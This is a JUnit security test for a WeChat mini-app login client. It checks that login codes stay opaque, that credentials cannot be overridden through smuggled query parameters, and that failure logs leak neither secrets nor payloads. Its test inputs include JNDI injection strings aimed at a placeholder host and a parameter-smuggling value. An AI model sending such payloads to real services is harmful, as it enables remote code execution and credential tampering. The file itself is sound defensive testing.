package cn.jualn.miniapp.third.wx.client;

import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.spi.ThrowableProxyUtil;
import ch.qos.logback.core.read.ListAppender;
import cn.jualn.miniapp.common.exception.GlobalExceptionHandler;
import cn.jualn.miniapp.infrastructure.cache.RedisService;
import cn.jualn.miniapp.module.auth.controller.AuthController;
import cn.jualn.miniapp.module.auth.service.impl.AuthServiceImpl;
import cn.jualn.miniapp.module.user.service.UserService;
import cn.jualn.miniapp.third.wx.config.WxProperties;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.net.httpserver.HttpServer;
import io.micrometer.core.instrument.simple.SimpleMeterRegistry;
import org.junit.jupiter.api.*;
import org.slf4j.LoggerFactory;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.WebClient;

import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/** Loopback provider with synthetic credentials; no production or application infrastructure. */
class WxLoginSecurityTest {
    private static final String SECRET = "synthetic-secret&x=1+%#${literal}";
    private HttpServer server;
    private WxClient client;
    private SimpleMeterRegistry registry;
    private volatile String query;
    private volatile String reply;
    private ListAppender<ILoggingEvent> logs;
    private final Logger logger = (Logger) LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @BeforeEach void setup() throws Exception {
        reply = "{\"openid\":\"synthetic-user\",\"session_key\":\"synthetic-session\"}";
        server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/", exchange -> {
            query = exchange.getRequestURI().getRawQuery();
            byte[] body = reply.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, body.length);
            exchange.getResponseBody().write(body);
            exchange.close();
        });
        server.start();
        WebClient web = WebClient.builder().filter((request, next) -> next.exchange(
                ClientRequest.from(request).url(URI.create("http://127.0.0.1:"
                        + server.getAddress().getPort() + request.url().getRawPath()
                        + "?" + request.url().getRawQuery())).build())).build();
        WxProperties props = new WxProperties(
                new WxProperties.Mp("synthetic-mp", SECRET, null, null, "https://example.invalid"),
                new WxProperties.Ma("synthetic-ma", SECRET, null, null));
        registry = new SimpleMeterRegistry();
        client = new WxClient(web, props, mock(RedisService.class), registry);
        logs = new ListAppender<>();
        logs.start();
        logger.addAppender(logs);
    }

    @AfterEach void cleanup() {
        logger.detachAppender(logs);
        logs.stop();
        server.stop(0);
        registry.close();
    }

    @Test void miniAndOauthKeepOpaqueCodesAndCredentialsInTheirOwnParameters() {
        for (String code : new String[]{"normal-code_123", "${jndi:ldap://example.invalid/probe}",
                "${jndi:rmi://example.invalid/probe}", "a&appid=other&secret=other+%#{} 中文"}) {
            assertEquals("synthetic-user", client.getMiniSession(code).getOpenid());
            assertQuery("synthetic-ma", "js_code", code);
            client.getMpOauthAccessToken(code);
            assertQuery("synthetic-mp", "code", code);
        }
    }

    @Test void loginProviderFailureLogsCodeWithoutCredentialOrPayload() throws Exception {
        String code = "${jndi:ldap://example.invalid/probe}";
        reply = "{\"errcode\":40029,\"errmsg\":\"synthetic-secret echoed provider detail\"}";
        UserService users = mock(UserService.class);
        MockMvc mvc = MockMvcBuilders.standaloneSetup(new AuthController(new AuthServiceImpl(client, users)))
                .setControllerAdvice(new GlobalExceptionHandler()).build();
        for (String route : new String[]{"/v1/auth", "/v1/auth/login"}) {
            mvc.perform(post(route).contentType(MediaType.APPLICATION_JSON)
                            .content(new ObjectMapper().writeValueAsString(Map.of("code", code))))
                    .andExpect(status().isBadGateway())
                    .andExpect(jsonPath("$.type").value("/problems/external-service-error"));
        }
        assertEquals(2, logs.list.size());
        verifyNoInteractions(users);
        for (ILoggingEvent event : logs.list) {
            String rendered = event.getFormattedMessage()
                    + (event.getThrowableProxy() == null ? "" : ThrowableProxyUtil.asString(event.getThrowableProxy()));
            assertTrue(rendered.contains("code=1000 providerCode=40029"));
            assertFalse(rendered.contains("synthetic-secret"));
            assertFalse(rendered.contains("jndi"));
            assertNull(event.getThrowableProxy());
        }
    }

    private void assertQuery(String appId, String codeName, String code) {
        Map<String, String> parameters = new LinkedHashMap<>();
        for (String pair : query.split("&")) {
            String[] parts = pair.split("=", 2);
            String name = URLDecoder.decode(parts[0], StandardCharsets.UTF_8);
            assertNull(parameters.put(name, URLDecoder.decode(parts[1], StandardCharsets.UTF_8)));
        }
        assertEquals(Map.of("appid", appId, "secret", SECRET, codeName, code,
                "grant_type", "authorization_code"), parameters);
    }
}
